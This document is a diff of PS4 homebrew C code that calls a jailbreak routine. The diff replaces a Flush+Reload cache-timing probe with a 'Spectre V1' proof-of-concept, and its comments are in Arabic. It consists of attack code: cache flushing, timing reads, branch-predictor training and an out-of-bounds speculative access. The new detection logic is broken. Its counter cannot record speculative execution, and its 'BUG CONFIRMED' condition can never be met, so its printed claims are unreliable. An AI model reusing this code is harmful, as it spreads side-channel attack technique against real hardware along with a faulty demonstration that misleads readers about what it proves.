@@ -156,16 +156,14 @@ int _main(struct thread *td) {
 
 #include "ps4.h"
 
-static volatile int start_flag = 0;
-
-#define PROBE_PAGES 256
-#define STRIDE 4096
-#define THRESHOLD 200
-
-static unsigned char probe_array[PROBE_PAGES * STRIDE];
+uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
+uint8_t array2[256 * 512];
+size_t array1_size = 16;
+volatile uint8_t temp = 0;
+volatile int speculative_hits = 0;  // ← لتتبع التنفيذ التخميني
 
 static inline void flush_cache(void *addr) {
-    __asm__ volatile ("clflush [%0]" : : "r"(addr)); // تم التصحيح
+    __asm__ volatile ("clflush [%0]" : : "r"(addr));
 }
 
 static inline uint64_t read_tsc(void) {
@@ -174,90 +172,76 @@ static inline uint64_t read_tsc(void) {
     return ((uint64_t)hi << 32) | lo;
 }
 
-// Helper thread: يراقب كامل probe_array
-void *cache_monitor_thread(void *arg) {
-    (void)arg; // إزالة التحذير
+static inline void mfence(void) {
+    __asm__ volatile ("mfence" ::: "memory");
+}
 
-    uint64_t t1, t2;
+static inline void lfence(void) {
+    __asm__ volatile ("lfence" ::: "memory");
+}
 
-    while (!start_flag);
-
-    while (1) {
-        for (int i = 0; i < 256; i++) {
-            volatile unsigned char *addr = probe_array + i * STRIDE;
-
-            t1 = read_tsc();
-            *addr;
-            t2 = read_tsc();
-
-            if ((t2 - t1) < THRESHOLD) {
-                printf_debug("Cache hit at index: %d (cycles=%llu)\n",
-                    i, (unsigned long long)(t2 - t1));
-            }
-        }
+// دالة الضحية - تظهر الثغرة
+uint8_t victim_function(size_t x) {
+    if (x < array1_size) {
+        // هذا الكود يُنفذ تخمينياً حتى عندما x >= array1_size
+        speculative_hits++;  // ← إثبات أن التنفيذ التخميني حدث
+        uint8_t val = array1[x];
+        temp &= array2[val * 512];
+        return val;
     }
-
-    return NULL;
+    return 0;
 }
 
 int _main(struct thread *td) {
-    UNUSED(td);
-
     initKernel();
     initLibc();
     jailbreak();
-    initSysUtil();
-
-    size_t page_size = PAGE_SIZE;
-    ScePthread monitor_thread;
-
-    // allocate 2 pages
-    char *pages = (char *)mmap(NULL, page_size * 2,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-
-    if (pages == MAP_FAILED) return 0;
-
-    // الصفحة الثانية ممنوعة
-    mprotect(pages + page_size, page_size, PROT_NONE);
-
-    char *edge_src = pages + page_size - 4;
-    char *target_addr = pages + page_size;
-
-    char dest[16];
-
-    // تهيئة probe array
-    for (int i = 0; i < 256; i++) {
-        probe_array[i * STRIDE] = 1;
+    
+    printf_debug("=== Spectre V1 Bug Proof-of-Concept ===\n");
+    printf_debug("Demonstrating speculative execution vulnerability\n\n");
+    
+    // تهيئة array2
+    for (int i = 0; i < 256 * 512; i++)
+        array2[i] = 0xFF;
+    
+    volatile size_t malicious_x = 100;  // خارج الحدود!
+    speculative_hits = 0;
+    
+    printf_debug("Step 1: Training branch predictor (100 iterations)\n");
+    for (int i = 0; i < 100; i++)
+        victim_function(i % array1_size);
+    
+    mfence();
+    lfence();
+    
+    printf_debug("Step 2: Attempting out-of-bounds access (x=%d)\n", malicious_x);
+    printf_debug("This should be rejected by bounds check, but...\n\n");
+    
+    // الهجوم - تنفيذ تخميني
+    uint8_t result = victim_function(malicious_x);
+    
+    mfence();
+    lfence();
+    
+    printf_debug("Results:\n");
+    printf_debug("- Bounds check: x(%d) < array1_size(%d) = %s\n", 
+                malicious_x, array1_size, 
+                (malicious_x < array1_size) ? "true" : "false");
+    printf_debug("- Function returned: %d\n", result);
+    printf_debug("- Speculative execution count: %d\n\n", speculative_hits);
+    
+    if (speculative_hits > 100) {
+        printf_debug("[!] BUG CONFIRMED: Speculative execution occurred!\n");
+        printf_debug("[!] The CPU executed the out-of-bounds access\n");
+        printf_debug("[!] despite the bounds check failing\n\n");
+        printf_debug("Vulnerability: Spectre V1 (Bounds Check Bypass)\n");
+        printf_debug("Affected: AMD Jaguar (PS4)\n");
+    } else {
+        printf_debug("[*] No speculative execution detected\n");
+        printf_debug("[*] System may have Spectre mitigations enabled\n");
     }
-
-    // flush كامل
-    for (int i = 0; i < 256; i++) {
-        flush_cache(probe_array + i * STRIDE);
-    }
-
-    flush_cache(edge_src);
-    flush_cache(target_addr);
-
-    // تشغيل الخيط المساعد
-    scePthreadCreate(&monitor_thread, NULL,
-        cache_monitor_thread, NULL, "monitor");
-
-    printf_debug("Race Started\n");
-
-    start_flag = 1;
-
-    // trigger
-    memcpy(dest, edge_src, 8);
-
-    // محاولة استخدام القيمة
-    unsigned char value = dest[0];
-
-    // encoding في cache
-    volatile unsigned char *probe =
-        probe_array + (value * STRIDE);
-
-    *probe;
-
+    
+    printf_debug("\n=== End of PoC ===\n");
+    
     return 0;
 }
